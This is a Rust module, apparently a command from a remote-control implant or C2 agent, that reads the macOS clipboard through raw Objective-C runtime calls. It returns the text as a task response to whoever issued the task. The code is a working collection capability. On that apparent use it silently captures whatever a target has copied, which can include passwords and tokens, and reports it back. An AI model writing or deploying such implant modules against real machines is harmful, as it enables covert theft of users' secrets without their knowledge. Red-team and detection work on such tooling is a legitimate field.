use crate::structs::Task;
use std::ffi::{c_void, CStr};

#[link(name = "AppKit", kind = "framework")]
extern "C" {}

#[link(name = "Foundation", kind = "framework")]
extern "C" {}

extern "C" {
    fn objc_getClass(name: *const u8) -> *mut c_void;
    fn sel_registerName(name: *const u8) -> *mut c_void;
    fn objc_msgSend(obj: *mut c_void, sel: *mut c_void, ...) -> *mut c_void;
}

unsafe fn get_clipboard_string() -> String {
    let pasteboard_class = objc_getClass(b"NSPasteboard\0".as_ptr());
    let general_sel = sel_registerName(b"generalPasteboard\0".as_ptr());
    let pasteboard = objc_msgSend(pasteboard_class, general_sel);

    let string_sel = sel_registerName(b"stringForType:\0".as_ptr());
    let nsstring_class = objc_getClass(b"NSString\0".as_ptr());
    let type_sel = sel_registerName(b"stringWithUTF8String:\0".as_ptr());
    let pb_type = objc_msgSend(
        nsstring_class,
        type_sel,
        b"public.utf8-plain-text\0".as_ptr(),
    );

    let result = objc_msgSend(pasteboard, string_sel, pb_type);
    if result.is_null() {
        return String::new();
    }

    let utf8_sel = sel_registerName(b"UTF8String\0".as_ptr());
    let cstr_ptr = objc_msgSend(result, utf8_sel) as *const i8;
    if cstr_ptr.is_null() {
        return String::new();
    }

    CStr::from_ptr(cstr_ptr).to_string_lossy().to_string()
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let output = unsafe { get_clipboard_string() };

    response.user_output = output;
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
